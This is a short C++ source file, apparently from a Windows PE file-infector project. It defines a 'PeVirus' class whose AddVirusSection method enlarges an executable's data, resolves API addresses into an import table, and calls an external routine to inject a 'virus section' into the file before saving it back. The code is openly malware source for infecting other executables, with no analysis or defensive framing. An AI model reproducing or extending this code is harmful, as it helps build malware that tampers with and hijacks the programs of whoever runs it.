#include "viruscpp.h"

namespace virus
{
    PeVirus::PeVirus(const std::string_view &full_path):
        PortableExecutable(full_path)
    {
        
    }

    void PeVirus::AddVirusSection(const std::vector<unsigned char> &section_data)
    {
        std::vector<unsigned char> data = this->pe::PortableExecutable::GetData();
        DWORD data_size = (DWORD)data.size();
        data.resize(data_size + 0x1000000); // + 16 Mb

        IAT iat;
        DATA function_data;
        function_data.iat = &iat;
        ::GetFunctionAddresses(&function_data);

        ::AddVirusSection((PVOID)&data[0], &data_size, (PVOID)&section_data[0], section_data.size(), &function_data);

        data.resize(data_size);

        this->pe::PortableExecutable::SetData(data);
    }
}

